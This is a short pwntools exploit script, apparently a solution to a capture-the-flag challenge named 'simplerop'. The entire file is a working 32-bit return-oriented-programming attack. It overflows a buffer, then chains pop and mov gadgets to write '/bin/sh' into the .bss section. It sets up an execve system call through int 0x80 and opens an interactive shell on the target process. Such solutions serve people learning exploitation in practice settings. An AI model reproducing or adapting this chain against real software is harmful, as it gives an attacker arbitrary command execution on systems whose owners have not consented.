from pwn import *

context.arch = "i386"
# context.log_level = "DEBUG"

p = process("./simplerop")
e = ELF("./simplerop")


sexit = e.symbols["exit"]

mov = next(e.search(asm("mov DWORD PTR [edx], eax ; ret")))
par = next(e.search(asm("pop eax ; ret")))
pdr = next(e.search(asm("pop edx ; ret")))
pdpcpbr = next(e.search(asm("pop edx ; pop ecx ; pop ebx ; ret")))
int80 = next(e.search(asm("int 0x80")))

bss = e.bss()


payload = ""

payload += "A"*28
payload += "B"*4

payload += p32(pdr)
payload += p32(bss)
payload += p32(par)
payload += "/bin"
payload += p32(mov)

payload += p32(pdr)
payload += p32(bss+4)
payload += p32(par)
payload += "/sh\x00"
payload += p32(mov)

payload += p32(pdpcpbr)
payload += p32(0)
payload += p32(0)
payload += p32(bss)

payload += p32(par)
payload += p32(11)

payload += p32(int80)

payload += p32(sexit)


p.sendlineafter("input :", payload)

p.interactive()